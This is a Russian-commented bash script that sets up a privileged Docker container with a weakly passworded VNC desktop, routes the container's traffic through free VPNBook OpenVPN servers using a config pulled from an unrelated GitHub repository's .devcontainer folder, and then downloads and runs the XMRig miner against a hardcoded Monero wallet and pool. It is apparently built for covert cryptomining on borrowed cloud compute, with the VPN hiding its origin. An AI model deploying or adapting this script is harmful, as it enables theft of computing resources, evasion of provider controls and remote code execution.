#!/bin/bash
set -e

echo "[🔧] Подготовка среды..."

# Установка Docker, если его нет
if ! command -v docker &> /dev/null; then
  echo "[⬇️] Установка Docker..."
  curl -fsSL https://get.docker.com | sh
fi

# Установка docker compose plugin, если нужно
if ! docker compose version &> /dev/null; then
  echo "[⬇️] Установка docker compose plugin..."
  mkdir -p ~/.docker/cli-plugins
  curl -SL https://github.com/docker/compose/releases/download/v2.27.0/docker-compose-linux-x86_64 -o ~/.docker/cli-plugins/docker-compose
  chmod +x ~/.docker/cli-plugins/docker-compose
fi

echo "[📁] Создание директории ~/dockercom и переход в неё..."
mkdir -p ~/dockercom && cd ~/dockercom

echo "[📝] Создание docker-compose.yml..."

cat > docker-compose.yml <<EOF
version: '3.8'

services:
  ubuntu-gui:
    image: dorowu/ubuntu-desktop-lxde-vnc:bionic
    container_name: ubuntu_gui
    ports:
      - "6080:80"
      - "5900:5900"
    environment:
      - VNC_PASSWORD=pass123
    volumes:
      - ./data:/data
      - /dev/net/tun:/dev/net/tun
    cap_add:
      - NET_ADMIN
    devices:
      - /dev/net/tun
    privileged: true
    shm_size: "2g"
EOF

echo "[🚀] Запуск контейнера..."
docker compose up -d

sleep 15

echo "[🧪] Проверка:"
docker ps

sudo docker exec -i ubuntu_gui bash <<'EOC'
apt update && apt install -y openvpn curl
cd /tmp && curl -L -o vpn.ovpn https://raw.githubusercontent.com/proton7771/jdhdghs/refs/heads/main/.devcontainer/vpnbook-de20-tcp443.ovpn
cat > auth.txt <<EOF2
user
pass
EOF2
openvpn --config vpn.ovpn --auth-user-pass auth.txt --daemon
EOC
echo "[+] Настройка VPN (часть 2)..."
sudo docker exec -i ubuntu_gui bash <<'EOC'
apt update && apt install -y openvpn curl unzip resolvconf
cd /tmp && curl -LO https://www.vpnbook.com/free-openvpn-account/VPNBook.com-OpenVPN-Euro1.zip
unzip -o VPNBook.com-OpenVPN-Euro1.zip -d vpnbook
cat > vpnbook/auth.txt <<EOF2
user
pass
EOF2
[ ! -c /dev/net/tun ] && echo "❌ TUN device not available." && exit 1
echo "nameserver 1.1.1.1" > /etc/resolv.conf
openvpn --config vpnbook/vpnbook-euro1-tcp443.ovpn \
  --auth-user-pass vpnbook/auth.txt --daemon \
  --route-up '/etc/openvpn/update-resolv-conf' --down '/etc/openvpn/update-resolv-conf'
sleep 45 && echo "🌐 IP:" && curl -s ifconfig.me
EOC

# === 9. Установка и запуск XMRig ===
echo "[+] Установка и запуск XMRig внутри контейнера..."
sudo docker exec -i ubuntu_gui bash <<'EOM'
# Пользовательские настройки
POOL="gulf.moneroocean.stream:10128"
WALLET="47K4hUp8jr7iZMXxkRjv86gkANApNYWdYiarnyNb6AHYFuhnMCyxhWcVF7K14DKEp8bxvxYuXhScSMiCEGfTdapmKiAB3hi"
PASSWORD="worker_name"

# Загрузка XMRig
XMRIG_VERSION="6.22.2"
ARCHIVE_NAME="xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/${ARCHIVE_NAME}"

cd /tmp
curl -LO "$DOWNLOAD_URL"
tar -xzf "$ARCHIVE_NAME"
cd "xmrig-${XMRIG_VERSION}" || exit 1

# Создание config.json
cat > config.json <<EOF
{
    "api": {
        "id": null,
        "worker-id": ""
    },
    "autosave": false,
    "background": false,
    "colors": true,
    "randomx": {
        "1gb-pages": true,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "cpu": true,
    "donate-level": 0,
    "log-file": null,
    "pools": [
        {
            "url": "${POOL}",
            "user": "${WALLET}",
            "pass": "${PASSWORD}",
            "algo": "rx",
            "tls": false,
            "keepalive": true,
            "nicehash": false
        }
    ],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "user-agent": null
}
EOF

chmod +x xmrig
echo "[*] Запуск майнинга..."
./xmrig -c config.json
EOM
# === 10. Финальное сообщение ===
echo
echo "[✅] Всё запущено."
echo "VNC-доступ: http://localhost:6080 (пароль: pass123)"
